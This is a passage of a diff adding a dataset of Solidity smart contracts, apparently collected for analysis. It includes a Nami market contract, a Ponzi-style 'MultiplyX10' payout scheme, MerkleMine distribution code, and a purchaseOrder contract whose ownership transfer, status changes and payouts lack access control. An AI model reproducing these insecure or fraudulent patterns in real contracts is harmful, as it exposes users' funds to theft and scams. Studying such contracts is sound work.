+        NamiMultiSigWallet namiWallet = NamiMultiSigWallet(namiMultiSigWallet);
+        if (namiWallet.isOwner(_withdraw)) {
+            _withdraw.transfer(_amount);
+        }
+    }
+
+
+    function setCrowdsaleManager(address _mgr) public
+        onlyEscrow
+    {
+        // You can't change crowdsale contract when migration is in progress.
+        require(currentPhase != Phase.Migrating);
+        crowdsaleManager = _mgr;
+    }
+
+    // internal migrate migration tokens
+    function _migrateToken(address _from, address _to)
+        internal
+    {
+        PresaleToken presale = PresaleToken(namiPresale);
+        uint256 newToken = presale.balanceOf(_from);
+        require(newToken > 0);
+        // burn old token
+        presale.burnTokens(_from);
+        // add new token to _to
+        balanceOf[_to] = balanceOf[_to].add(newToken);
+        // add new token to totalSupply
+        totalSupply = totalSupply.add(newToken);
+        emit LogMigrate(_from, _to, newToken);
+        emit Transfer(this,_to,newToken);
+    }
+
+    // migate token function for Nami Team
+    function migrateToken(address _from, address _to) public
+        onlyEscrow
+    {
+        _migrateToken(_from, _to);
+    }
+
+    // migrate token for investor
+    function migrateForInvestor() public {
+        _migrateToken(msg.sender, msg.sender);
+    }
+
+    // Nami internal exchange
+    
+    // event for Nami exchange
+    event TransferToBuyer(address indexed _from, address indexed _to, uint _value, address indexed _seller);
+    event TransferToExchange(address indexed _from, address indexed _to, uint _value, uint _price);
+    
+    
+    /**
+     * @dev Transfer the specified amount of tokens to the NamiExchange address.
+     *      Invokes the `tokenFallbackExchange` function.
+     *      The token transfer fails if the recipient is a contract
+     *      but does not implement the `tokenFallbackExchange` function
+     *      or the fallback function to receive funds.
+     *
+     * @param _to    Receiver address.
+     * @param _value Amount of tokens that will be transferred.
+     * @param _price price to sell token.
+     */
+     
+    function transferToExchange(address _to, uint _value, uint _price) public {
+        uint codeLength;
+        
+        assembly {
+            codeLength := extcodesize(_to)
+        }
+        
+        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
+        balanceOf[_to] = balanceOf[_to].add(_value);
+        emit Transfer(msg.sender,_to,_value);
+        if (codeLength > 0) {
+            ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
+            receiver.tokenFallbackExchange(msg.sender, _value, _price);
+            emit TransferToExchange(msg.sender, _to, _value, _price);
+        }
+    }
+    
+    /**
+     * @dev Transfer the specified amount of tokens to the NamiExchange address.
+     *      Invokes the `tokenFallbackBuyer` function.
+     *      The token transfer fails if the recipient is a contract
+     *      but does not implement the `tokenFallbackBuyer` function
+     *      or the fallback function to receive funds.
+     *
+     * @param _to    Receiver address.
+     * @param _value Amount of tokens that will be transferred.
+     * @param _buyer address of seller.
+     */
+     
+    function transferToBuyer(address _to, uint _value, address _buyer) public {
+        uint codeLength;
+        
+        assembly {
+            codeLength := extcodesize(_to)
+        }
+        
+        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
+        balanceOf[_to] = balanceOf[_to].add(_value);
+        emit Transfer(msg.sender,_to,_value);
+        if (codeLength > 0) {
+            ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
+            receiver.tokenFallbackBuyer(msg.sender, _value, _buyer);
+            emit TransferToBuyer(msg.sender, _to, _value, _buyer);
+        }
+    }
+//-------------------------------------------------------------------------------------------------------
+}
+
+/**
+ * Math operations with safety checks
+ */
+library SafeMath {
+  function mul(uint a, uint b) internal pure returns (uint) {
+    uint c = a * b;
+    assert(a == 0 || c / a == b);
+    return c;
+  }
+
+  function div(uint a, uint b) internal pure returns (uint) {
+    // assert(b > 0); // Solidity automatically throws when dividing by 0
+    uint c = a / b;
+    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+    return c;
+  }
+
+  function sub(uint a, uint b) internal pure returns (uint) {
+    assert(b <= a);
+    return a - b;
+  }
+
+  function add(uint a, uint b) internal pure returns (uint) {
+    uint c = a + b;
+    assert(c >= a);
+    return c;
+  }
+
+  function max64(uint64 a, uint64 b) internal pure returns (uint64) {
+    return a >= b ? a : b;
+  }
+
+  function min64(uint64 a, uint64 b) internal pure returns (uint64) {
+    return a < b ? a : b;
+  }
+
+  function max256(uint256 a, uint256 b) internal pure returns (uint256) {
+    return a >= b ? a : b;
+  }
+
+  function min256(uint256 a, uint256 b) internal pure returns (uint256) {
+    return a < b ? a : b;
+  }
+}
+
+
+
+contract NamiMarket{
+    using SafeMath for uint256;
+
+    constructor(address _escrow, address _namiMultiSigWallet, address _namiAddress) public {
+        require(_namiMultiSigWallet != 0x0);
+        escrow = _escrow;
+        namiMultiSigWallet = _namiMultiSigWallet;
+        NamiAddr = _namiAddress;
+    }
+
+    // escrow has exclusive priveleges to call administrative
+    // functions on this contract.
+    address public escrow;
+    uint public minWithdraw =  10**16; // 0.01 ether
+    uint public maxWithdraw = 10**18; // max NAC withdraw one time, 1 ether
+
+    // Gathered funds can be withdraw only to namimultisigwallet's address.
+    address public namiMultiSigWallet;
+
+    /// address of Nami token
+    address public NamiAddr;
+    bool public isPause;
+    /*
+    *
+    * list setting function
+    */
+    mapping(address => bool) public isController;
+    
+    /**
+     * 
+     * List event
+     */
+    event Deposit(address indexed user, uint amount, uint timeDeposit);
+    event Withdraw(address indexed user, uint amount, uint timeWithdraw);
+
+    modifier onlyEscrow() {
+        require(msg.sender == escrow);
+        _;
+    }
+
+    modifier onlyNami {
+        require(msg.sender == NamiAddr);
+        _;
+    }
+
+    modifier onlyNamiMultisig {
+        require(msg.sender == namiMultiSigWallet);
+        _;
+    }
+    
+    modifier onlyController {
+        require(isController[msg.sender] == true);
+        _;
+    }
+    
+    // change escrow
+    function changeEscrow(address _escrow) public
+        onlyNamiMultisig
+    {
+        require(_escrow != 0x0);
+        escrow = _escrow;
+    }
+    
+    // change pause
+    function changePause() public
+        onlyEscrow
+    {
+        isPause = !isPause;
+    }
+    
+    // min and max for withdraw nac
+    function changeMinWithdraw(uint _minWithdraw) public
+        onlyEscrow
+    {
+        require(_minWithdraw != 0);
+        minWithdraw = _minWithdraw;
+    }
+
+    function changeMaxWithdraw(uint _maxNac) public
+        onlyEscrow
+    {
+        require(_maxNac != 0);
+        maxWithdraw = _maxNac;
+    }
+
+    /// @dev withdraw ether to nami multisignature wallet, only escrow can call
+    /// @param _amount value ether in wei to withdraw
+    function withdrawEther(uint _amount, address _to) public
+        onlyEscrow
+    {
+        require(namiMultiSigWallet != address(0x0));
+        // Available at any phase.
+        if (address(this).balance > 0) {
+            _to.transfer(_amount);
+        }
+    }
+
+
+    /// @dev withdraw NAC to nami multisignature wallet, only escrow can call
+    /// @param _amount value NAC to withdraw
+    function withdrawNac(uint _amount) public
+        onlyEscrow
+    {
+        require(namiMultiSigWallet != address(0x0));
+        // Available at any phase.
+        NamiCrowdSale namiToken = NamiCrowdSale(NamiAddr);
+        if (namiToken.balanceOf(address(this)) > 0) {
+            namiToken.transfer(namiMultiSigWallet, _amount);
+        }
+    }
+    
+    // set controller address
+    /**
+     * make new controller
+     * require input address is not a controller
+     * execute any time in sc state
+     */
+    function setController(address _controller)
+    public
+    onlyEscrow
+    {
+        require(!isController[_controller]);
+        isController[_controller] = true;
+    }
+
+    /**
+     * remove controller
+     * require input address is a controller
+     * execute any time in sc state
+     */
+    function removeController(address _controller)
+    public
+    onlyEscrow
+    {
+        require(isController[_controller]);
+        isController[_controller] = false;
+    }
+   ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    string public name = ""Nami Market"";
+    
+    function depositEth() public payable
+    {
+        require(msg.value > 0);
+        emit Deposit(msg.sender, msg.value, now);
+    }
+    
+    function () public payable
+    {
+        depositEth();
+    }
+    
+    function withdrawToken(address _account, uint _amount) public
+        onlyController
+    {
+        require(_account != address(0x0) && _amount != 0);
+        require(_amount >= minWithdraw && _amount <= maxWithdraw);
+        if (address(this).balance > 0) {
+            _account.transfer(_amount);
+        }
+        // emit event
+        emit Withdraw(_account, _amount, now);
+    }
+}",DISASSEMBLED
+11,"///:::::::::::::::::::::::::::::::::::::::::::::::::::::::Welcome to MultiplyX10!
+//
+// Multiply your Ether by 10x!!
+//
+// Minimum Deposit: 2 Ether (2000 Finney)
+//
+// NO HOUSE FEES!!
+//
+// Everyone gets paid in the line! After somebody has been paid X10, he is removed and the next person is in line for payment!
+//
+// Multiply your ETH Now!
+//
+///:::::::::::::::::::::::::::::::::::::::::::::::::::::::Start
+
+contract MultiplyX10 {
+
+  struct InvestorArray { address EtherAddress; uint Amount; }
+  InvestorArray[] public depositors;
+
+///:::::::::::::::::::::::::::::::::::::::::::::::::::::::Variables
+
+  uint public Total_Investors=0;
+  uint public Balance = 0;
+  uint public Total_Deposited=0;
+  uint public Total_Paid_Out=0;
+  uint public Multiplier=10;
+  string public Message=""Welcome Investor! Multiply your ETH Now!"";
+
+///:::::::::::::::::::::::::::::::::::::::::::::::::::::::Init
+
+  function() { enter(); }
+  
+//:::::::::::::::::::::::::::::::::::::::::::::::::::::::Enter
+
+  function enter() {
+    if (msg.value > 2 ether) {
+
+    uint Amount=msg.value;								//set amount to how much the investor deposited
+    Total_Investors=depositors.length+1;   					 //count investors
+    depositors.length += 1;                        						//increase array lenght
+    depositors[depositors.length-1].EtherAddress = msg.sender; //add net investor's address
+    depositors[depositors.length-1].Amount = Amount;          //add net investor's amount
+    Balance += Amount;               						// balance update
+    Total_Deposited+=Amount;       						//update deposited Amount
+    uint payment;
+    uint index=0;
+
+    while (Balance > (depositors[index].Amount * Multiplier) && index<Total_Investors)
+     {
+
+	if(depositors[index].Amount!=0)
+	{
+      payment = depositors[index].Amount *Multiplier;                           //calculate pay out
+      depositors[index].EtherAddress.send(payment);                        //send pay out to investor
+      Balance -= depositors[index].Amount *Multiplier;                         //balance update
+      Total_Paid_Out += depositors[index].Amount *Multiplier;                 //update paid out amount   
+	depositors[index].Amount=0;                                                               //remove investor from the game after he is paid out! He must invest again if he wants to earn more!
+	}
+	index++; //go to next investor
+
+      }
+      //---end
+  }
+}
+}",DISASSEMBLED
+12,"pragma solidity 0.4.24;
+
+/**
+ * @title ERC20Basic
+ * @dev Simpler version of ERC20 interface
+ * @dev see https://github.com/ethereum/EIPs/issues/179
+ */
+contract ERC20Basic {
+    uint256 public totalSupply;
+    function balanceOf(address who) public view returns (uint256);
+    function transfer(address to, uint256 value) public returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+}
+
+/**
+ * @title ERC20 interface
+ * @dev see https://github.com/ethereum/EIPs/issues/20
+ */
+contract ERC20 is ERC20Basic {
+    function allowance(address owner, address spender) public view returns (uint256);
+    function transferFrom(address from, address to, uint256 value) public returns (bool);
+    function approve(address spender, uint256 value) public returns (bool);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+/**
+ * @title SafeMath
+ * @dev Math operations with safety checks that throw on error
+ */
+library SafeMath {
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+        uint256 c = a * b;
+        assert(c / a == b);
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        // assert(b > 0); // Solidity automatically throws when dividing by 0
+        uint256 c = a / b;
+        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        assert(b <= a);
+        return a - b;
+    }
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        assert(c >= a);
+        return c;
+    }
+}
+
+/*
+ * @title MerkleProof
+ * @dev Merkle proof verification
+ * @note Based on https://github.com/ameensol/merkle-tree-solidity/blob/master/src/MerkleProof.sol
+ */
+library MerkleProof {
+  /*
+   * @dev Verifies a Merkle proof proving the existence of a leaf in a Merkle tree. Assumes that each pair of leaves
+   * and each pair of pre-images is sorted.
+   * @param _proof Merkle proof containing sibling hashes on the branch from the leaf to the root of the Merkle tree
+   * @param _root Merkle root
+   * @param _leaf Leaf of Merkle tree
+   */
+  function verifyProof(bytes _proof, bytes32 _root, bytes32 _leaf) public pure returns (bool) {
+    // Check if proof length is a multiple of 32
+    if (_proof.length % 32 != 0) return false;
+
+    bytes32 proofElement;
+    bytes32 computedHash = _leaf;
+
+    for (uint256 i = 32; i <= _proof.length; i += 32) {
+      assembly {
+        // Load the current element of the proof
+        proofElement := mload(add(_proof, i))
+      }
+
+      if (computedHash < proofElement) {
+        // Hash(current computed hash + current element of the proof)
+        computedHash = keccak256(computedHash, proofElement);
+      } else {
+        // Hash(current element of the proof + current computed hash)
+        computedHash = keccak256(proofElement, computedHash);
+      }
+    }
+
+    // Check if the computed hash (root) is equal to the provided root
+    return computedHash == _root;
+  }
+}
+
+/**
+ * @title MerkleMine
+ * @dev Token distribution based on providing Merkle proofs of inclusion in genesis state to generate allocation
+ */
+contract MerkleMine {
+    using SafeMath for uint256;
+
+    // ERC20 token being distributed
+    ERC20 public token;
+    // Merkle root representing genesis state which encodes token recipients
+    bytes32 public genesisRoot;
+    // Total amount of tokens that can be generated
+    uint256 public totalGenesisTokens;
+    // Total number of recipients included in genesis state
+    uint256 public totalGenesisRecipients;
+    // Amount of tokens per recipient allocation. Equal to `totalGenesisTokens` / `totalGenesisRecipients`
+    uint256 public tokensPerAllocation;
+    // Minimum ETH balance threshold for recipients included in genesis state
+    uint256 public balanceThreshold;
+    // Block number of genesis - used to determine which ETH accounts are included in the genesis state
+    uint256 public genesisBlock;
+    // Start block where a third party caller (not the recipient) can generate and split the allocation with the recipient
+    // As the current block gets closer to `callerAllocationEndBlock`, the caller receives a larger precentage of the allocation
+    uint256 public callerAllocationStartBlock;
+    // From this block onwards, a third party caller (not the recipient) can generate and claim the recipient's full allocation
+    uint256 public callerAllocationEndBlock;
+    // Number of blocks in the caller allocation period as defined by `callerAllocationEndBlock` - `callerAllocationStartBlock`
+    uint256 public callerAllocationPeriod;
+
+    // Track if the generation process is started
+    bool public started;
+
+    // Track the already generated allocations for recipients
+    mapping (address => bool) public generated;
+
+    // Check that a recipient's allocation has not been generated
+    modifier notGenerated(address _recipient) {
+        require(!generated[_recipient]);
+        _;
+    }
+
+    // Check that the generation period is started
+    modifier isStarted() {
+        require(started);
+        _;
+    }
+
+    // Check that the generation period is not started
+    modifier isNotStarted() {
+        require(!started);
+        _;
+    }
+
+    event Generate(address indexed _recipient, address indexed _caller, uint256 _recipientTokenAmount, uint256 _callerTokenAmount, uint256 _block);
+
+    /**
+     * @dev MerkleMine constructor
+     * @param _token ERC20 token being distributed
+     * @param _genesisRoot Merkle root representing genesis state which encodes token recipients
+     * @param _totalGenesisTokens Total amount of tokens that can be generated
+     * @param _totalGenesisRecipients Total number of recipients included in genesis state
+     * @param _balanceThreshold Minimum ETH balance threshold for recipients included in genesis state
+     * @param _genesisBlock Block number of genesis - used to determine which ETH accounts are included in the genesis state
+     * @param _callerAllocationStartBlock Start block where a third party caller (not the recipient) can generate and split the allocation with the recipient
+     * @param _callerAllocationEndBlock From this block onwards, a third party caller (not the recipient) can generate and claim the recipient's full allocation
+     */
+    function MerkleMine(
+        address _token,
+        bytes32 _genesisRoot,
+        uint256 _totalGenesisTokens,
+        uint256 _totalGenesisRecipients,
+        uint256 _balanceThreshold,
+        uint256 _genesisBlock,
+        uint256 _callerAllocationStartBlock,
+        uint256 _callerAllocationEndBlock
+    )
+        public
+    {
+        // Address of token contract must not be null
+        require(_token != address(0));
+        // Number of recipients must be non-zero
+        require(_totalGenesisRecipients > 0);
+        // Genesis block must be at or before the current block
+        require(_genesisBlock <= block.number);
+        // Start block for caller allocation must be after current block
+        require(_callerAllocationStartBlock > block.number);
+        // End block for caller allocation must be after caller allocation start block
+        require(_callerAllocationEndBlock > _callerAllocationStartBlock);
+
+        token = ERC20(_token);
+        genesisRoot = _genesisRoot;
+        totalGenesisTokens = _totalGenesisTokens;
+        totalGenesisRecipients = _totalGenesisRecipients;
+        tokensPerAllocation = _totalGenesisTokens.div(_totalGenesisRecipients);
+        balanceThreshold = _balanceThreshold;
+        genesisBlock = _genesisBlock;
+        callerAllocationStartBlock = _callerAllocationStartBlock;
+        callerAllocationEndBlock = _callerAllocationEndBlock;
+        callerAllocationPeriod = _callerAllocationEndBlock.sub(_callerAllocationStartBlock);
+    }
+
+    /**
+     * @dev Start the generation period - first checks that this contract's balance is equal to `totalGenesisTokens`
+     * The generation period must not already be started
+     */
+    function start() external isNotStarted {
+        // Check that this contract has a sufficient balance for the generation period
+        require(token.balanceOf(this) >= totalGenesisTokens);
+
+        started = true;
+    }
+
+    /**
+     * @dev Generate a recipient's token allocation. Generation period must be started. Starting from `callerAllocationStartBlock`
+     * a third party caller (not the recipient) can invoke this function to generate the recipient's token
+     * allocation and claim a percentage of it. The percentage of the allocation claimed by the
+     * third party caller is determined by how many blocks have elapsed since `callerAllocationStartBlock`.
+     * After `callerAllocationEndBlock`, a third party caller can claim the full allocation
+     * @param _recipient Recipient of token allocation
+     * @param _merkleProof Proof of recipient's inclusion in genesis state Merkle root
+     */
+    function generate(address _recipient, bytes _merkleProof) external isStarted notGenerated(_recipient) {
+        // Check the Merkle proof
+        bytes32 leaf = keccak256(_recipient);
+        // _merkleProof must prove inclusion of _recipient in the genesis state root
+        require(MerkleProof.verifyProof(_merkleProof, genesisRoot, leaf));
+
+        generated[_recipient] = true;
+
+        address caller = msg.sender;
+
+        if (caller == _recipient) {
+            // If the caller is the recipient, transfer the full allocation to the caller/recipient
+            require(token.transfer(_recipient, tokensPerAllocation));
+
+            Generate(_recipient, _recipient, tokensPerAllocation, 0, block.number);
+        } else {
+            // If the caller is not the recipient, the token allocation generation
+            // can only take place if we are in the caller allocation period
+            require(block.number >= callerAllocationStartBlock);
+
+            uint256 callerTokenAmount = callerTokenAmountAtBlock(block.number);
+            uint256 recipientTokenAmount = tokensPerAllocation.sub(callerTokenAmount);
+
+            if (callerTokenAmount > 0) {
+                require(token.transfer(caller, callerTokenAmount));
+            }
+
+            if (recipientTokenAmount > 0) {
+                require(token.transfer(_recipient, recipientTokenAmount));
+            }
+
+            Generate(_recipient, caller, recipientTokenAmount, callerTokenAmount, block.number);
+        }
+    }
+
+    /**
+     * @dev Return the amount of tokens claimable by a third party caller when generating a recipient's token allocation at a given block
+     * @param _blockNumber Block at which to compute the amount of tokens claimable by a third party caller
+     */
+    function callerTokenAmountAtBlock(uint256 _blockNumber) public view returns (uint256) {
+        if (_blockNumber < callerAllocationStartBlock) {
+            // If the block is before the start of the caller allocation period, the third party caller can claim nothing
+            return 0;
+        } else if (_blockNumber >= callerAllocationEndBlock) {
+            // If the block is at or after the end block of the caller allocation period, the third party caller can claim everything
+            return tokensPerAllocation;
+        } else {
+            // During the caller allocation period, the third party caller can claim an increasing percentage
+            // of the recipient's allocation based on a linear curve - as more blocks pass in the caller allocation
+            // period, the amount claimable by the third party caller increases linearly
+            uint256 blocksSinceCallerAllocationStartBlock = _blockNumber.sub(callerAllocationStartBlock);
+            return tokensPerAllocation.mul(blocksSinceCallerAllocationStartBlock).div(callerAllocationPeriod);
+        }
+    }
+}
+
+/**
+ * @title BytesUtil
+ * @dev Utilities for extracting bytes from byte arrays
+ * Functions taken from:
+ * - https://github.com/ethereum/solidity-examples/blob/master/src/unsafe/Memory.sol
+ * - https://github.com/ethereum/solidity-examples/blob/master/src/bytes/Bytes.sol
+ */
+library BytesUtil{
+    uint256 internal constant BYTES_HEADER_SIZE = 32;
+    uint256 internal constant WORD_SIZE = 32;
+    
+    /**
+     * @dev Returns a memory pointer to the data portion of the provided bytes array.
+     * @param bts Memory byte array
+     */
+    function dataPtr(bytes memory bts) internal pure returns (uint256 addr) {
+        assembly {
+            addr := add(bts, /*BYTES_HEADER_SIZE*/ 32)
+        }
+    }
+    
+    /**
+     * @dev Copy 'len' bytes from memory address 'src', to address 'dest'.
+     * This function does not check the or destination, it only copies
+     * the bytes.
+     * @param src Memory address of source byte array
+     * @param dest Memory address of destination byte array
+     * @param len Number of bytes to copy from `src` to `dest`
+     */
+    function copy(uint256 src, uint256 dest, uint256 len) internal pure {
+        // Copy word-length chunks while possible
+        for (; len >= WORD_SIZE; len -= WORD_SIZE) {
+            assembly {
+                mstore(dest, mload(src))
+            }
+            dest += WORD_SIZE;
+            src += WORD_SIZE;
+        }
+
+        // Copy remaining bytes
+        uint256 mask = 256 ** (WORD_SIZE - len) - 1;
+        assembly {
+            let srcpart := and(mload(src), not(mask))
+            let destpart := and(mload(dest), mask)
+            mstore(dest, or(destpart, srcpart))
+        }
+    }
+
+    /**
+     * @dev Creates a 'bytes memory' variable from the memory address 'addr', with the
+     * length 'len'. The function will allocate new memory for the bytes array, and
+     * the 'len bytes starting at 'addr' will be copied into that new memory.
+     * @param addr Memory address of input byte array
+     * @param len Number of bytes to copy from input byte array
+     */
+    function toBytes(uint256 addr, uint256 len) internal pure returns (bytes memory bts) {
+        bts = new bytes(len);
+        uint256 btsptr = dataPtr(bts);
+        copy(addr, btsptr, len);
+    }
+    
+    /**
+     * @dev Copies 'len' bytes from 'bts' into a new array, starting at the provided 'startIndex'.
+     * Returns the new copy.
+     * Requires that:
+     *  - 'startIndex + len <= self.length'
+     * The length of the substring is: 'len'
+     * @param bts Memory byte array to copy from
+     * @param startIndex Index of `bts` to start copying bytes from
+     * @param len Number of bytes to copy from `bts`
+     */
+    function substr(bytes memory bts, uint256 startIndex, uint256 len) internal pure returns (bytes memory) {
+        require(startIndex + len <= bts.length);
+        if (len == 0) {
+            return;
+        }
+        uint256 addr = dataPtr(bts);
+        return toBytes(addr + startIndex, len);
+    }
+
+    /**
+     * @dev Reads a bytes32 value from a byte array by copying 32 bytes from `bts` starting at the provided `startIndex`.
+     * @param bts Memory byte array to copy from
+     * @param startIndex Index of `bts` to start copying bytes from
+     */
+    function readBytes32(bytes memory bts, uint256 startIndex) internal pure returns (bytes32 result) {
+        require(startIndex + 32 <= bts.length);
+
+        uint256 addr = dataPtr(bts);
+
+        assembly {
+            result := mload(add(addr, startIndex))
+        }
+
+        return result;
+    }
+}
+
+/**
+ * @title MultiMerkleMine
+ * @dev The MultiMerkleMine contract is purely a convenience wrapper around an existing MerkleMine contract deployed on the blockchain.
+ */
+contract MultiMerkleMine {
+	using SafeMath for uint256;
+
+	/**
+     * @dev Generates token allocations for multiple recipients. Generation period must be started.
+     * @param _merkleMineContract Address of the deployed MerkleMine contract
+     * @param _recipients Array of recipients
+     * @param _merkleProofs Proofs for respective recipients constructed in the format: 
+     *       [proof_1_size, proof_1, proof_2_size, proof_2, ... , proof_n_size, proof_n]
+     */
+	function multiGenerate(address _merkleMineContract, address[] _recipients, bytes _merkleProofs) public {
+		MerkleMine mine = MerkleMine(_merkleMineContract);
+		ERC20 token = ERC20(mine.token());
+
+		require(
+			block.number >= mine.callerAllocationStartBlock(),
+			""caller allocation period has not started""
+		);
+		
+		uint256 initialBalance = token.balanceOf(this);
+		bytes[] memory proofs = new bytes[](_recipients.length);
+
+		// Counter to keep track of position in `_merkleProofs` byte array
+		uint256 i = 0;
+		// Counter to keep track of index of each extracted Merkle proof
+		uint256 j = 0;
+
+		// Extract proofs
+		while(i < _merkleProofs.length){
+			uint256 proofSize = uint256(BytesUtil.readBytes32(_merkleProofs, i));
+
+			require(
+				proofSize % 32 == 0,
+				""proof size must be a multiple of 32""
+			);
+
+			proofs[j] = BytesUtil.substr(_merkleProofs, i + 32, proofSize);
+
+			i = i + 32 + proofSize;
+			j++;
+		}
+
+		require(
+			_recipients.length == j,
+			""number of recipients != number of proofs""
+		);
+
+		for (uint256 k = 0; k < _recipients.length; k++) {
+			// If recipient's token allocation has not been generated, generate the token allocation
+			// Else, continue to the next recipient
+			if (!mine.generated(_recipients[k])) {
+				mine.generate(_recipients[k], proofs[k]);
+			}
+		}
+
+		uint256 newBalanceSinceAllocation = token.balanceOf(this);
+		uint256 callerTokensGenerated = newBalanceSinceAllocation.sub(initialBalance);
+
+		// Transfer caller's portion of tokens generated by this function call 
+		if (callerTokensGenerated > 0) {
+			require(token.transfer(msg.sender, callerTokensGenerated));
+		}
+	}
+}
+",DISASSEMBLED
+15,"pragma solidity 0.4.23;
+
+ contract Ownable {
+
+     address public owner;
+
+     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+     constructor() public {
+         owner = msg.sender;
+     }
+
+     modifier onlyOwner() {
+         require(
+             msg.sender == owner,
+             ""you have no right to execute this method."");
+         _;
+     }
+
+     function transferOwnership(address newOwner) public  {         
+         require(
+             newOwner != owner,
+             ""wrong address""
+         );                                                         
+         emit OwnershipTransferred(owner, newOwner);
+         owner = newOwner;
+     }
+ }
+
+ contract purchaseOrder is Ownable {  
+                  
+     address public bank ;  
+     address public customer;     
+     address public sme;          
+     address public ec;           
+     address public logistic;     
+     string public productNumber; 
+     uint public pOfSme;
+     uint public pOfEc;
+     uint public pOfLogistic;
+
+     mapping(uint => bool) public status;
+
+     event StatusChanged(address indexed _from, bool indexed _newStatus);
+     event Payment(address _sender, uint value);
+
+     function () external payable{ 
+         pay();
+     }
+
+     constructor(address _customer, address _sme, address _ec, address _logistic, string _productNumber, uint _pOfSme, 
+     uint _pOfEc, uint _pOfLogistic)  public {
+         customer = _customer;
+         sme = _sme;
+         ec = _ec;
+         logistic = _logistic;
+         productNumber = _productNumber;
+         pOfSme = _pOfSme;
+         pOfEc = _pOfEc;
+         pOfLogistic = _pOfLogistic;
+         require(
+             _pOfSme + _pOfEc + _pOfLogistic == 100,
+             ""_pOfSme + _pOfEc + _pOfLogistic need = 100""
+         );
+         status[0] = true;
+         for(uint8 i = 1; i < 7; i++){
+             status[i] = false;
+         }
+     }
+
+     function changeStatus(uint stepNumber, bool newStatus) public {
+         emit StatusChanged(msg.sender, newStatus);
+         require(
+             stepNumber != 0 && stepNumber != 6,
+             ""wrong step !""
+         );                                                                         
+         status[stepNumber] = newStatus;
+         if(stepNumber == 5){                                                                         
+             finalized();
+         }
+     }
+
+     function finalized() public {                                                         
+         uint contractBalance = address(this).balance;
+         ec.transfer(contractBalance*pOfEc/100);
+         sme.transfer(contractBalance*pOfSme/100);
+         logistic.transfer(contractBalance*pOfLogistic/100);
+         emit Payment(msg.sender, contractBalance);
+         status[6] = true; 
+     }
+
+     function disable() public  {
+         for(uint8 i = 0; i < 7; i++){
+             status[i] = false;
+         }
+     }
+
+     function pay() internal   {
+         emit Payment(msg.sender, msg.value);
+     } 
+ }",DISASSEMBLED
+13,"pragma solidity 0.4.24;
+
+/**
+ * @title ERC20Basic
+ * @dev Simpler version of ERC20 interface
+ * @dev see https://github.com/ethereum/EIPs/issues/179
+ */
+contract ERC20Basic {
+    uint256 public totalSupply;
+    function balanceOf(address who) public view returns (uint256);
+    function transfer(address to, uint256 value) public returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+}
+
+/**
+ * @title ERC20 interface
+ * @dev see https://github.com/ethereum/EIPs/issues/20
+ */
+contract ERC20 is ERC20Basic {
+    function allowance(address owner, address spender) public view returns (uint256);
+    function transferFrom(address from, address to, uint256 value) public returns (bool);
+    function approve(address spender, uint256 value) public returns (bool);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+/**
+ * @title SafeMath
+ * @dev Math operations with safety checks that throw on error
+ */
+library SafeMath {
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+        uint256 c = a * b;
+        assert(c / a == b);
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        // assert(b > 0); // Solidity automatically throws when dividing by 0
+        uint256 c = a / b;
+        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        assert(b <= a);
+        return a - b;
+    }
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        assert(c >= a);
+        return c;
+    }
+}
+
+/*
+ * @title MerkleProof
+ * @dev Merkle proof verification
+ * @note Based on https://github.com/ameensol/merkle-tree-solidity/blob/master/src/MerkleProof.sol
+ */
+library MerkleProof {
+  /*
+   * @dev Verifies a Merkle proof proving the existence of a leaf in a Merkle tree. Assumes that each pair of leaves
+   * and each pair of pre-images is sorted.
+   * @param _proof Merkle proof containing sibling hashes on the branch from the leaf to the root of the Merkle tree
+   * @param _root Merkle root
+   * @param _leaf Leaf of Merkle tree
+   */
+  function verifyProof(bytes _proof, bytes32 _root, bytes32 _leaf) public pure returns (bool) {
+    // Check if proof length is a multiple of 32
+    if (_proof.length % 32 != 0) return false;
+
+    bytes32 proofElement;
+    bytes32 computedHash = _leaf;
+
+    for (uint256 i = 32; i <= _proof.length; i += 32) {
+      assembly {
+        // Load the current element of the proof
+        proofElement := mload(add(_proof, i))
+      }
+
+      if (computedHash < proofElement) {
+        // Hash(current computed hash + current element of the proof)
+        computedHash = keccak256(computedHash, proofElement);
+      } else {
+        // Hash(current element of the proof + current computed hash)
+        computedHash = keccak256(proofElement, computedHash);
+      }
+    }
+
+    // Check if the computed hash (root) is equal to the provided root
+    return computedHash == _root;
+  }
+}
+
+/**
+ * @title MerkleMine
+ * @dev Token distribution based on providing Merkle proofs of inclusion in genesis state to generate allocation
+ */
+contract MerkleMine {
+    using SafeMath for uint256;
+
+    // ERC20 token being distributed
+    ERC20 public token;
+    // Merkle root representing genesis state which encodes token recipients
+    bytes32 public genesisRoot;
+    // Total amount of tokens that can be generated
+    uint256 public totalGenesisTokens;
+    // Total number of recipients included in genesis state
+    uint256 public totalGenesisRecipients;
+    // Amount of tokens per recipient allocation. Equal to `totalGenesisTokens` / `totalGenesisRecipients`
+    uint256 public tokensPerAllocation;
+    // Minimum ETH balance threshold for recipients included in genesis state
+    uint256 public balanceThreshold;
+    // Block number of genesis - used to determine which ETH accounts are included in the genesis state
+    uint256 public genesisBlock;
+    // Start block where a third party caller (not the recipient) can generate and split the allocation with the recipient
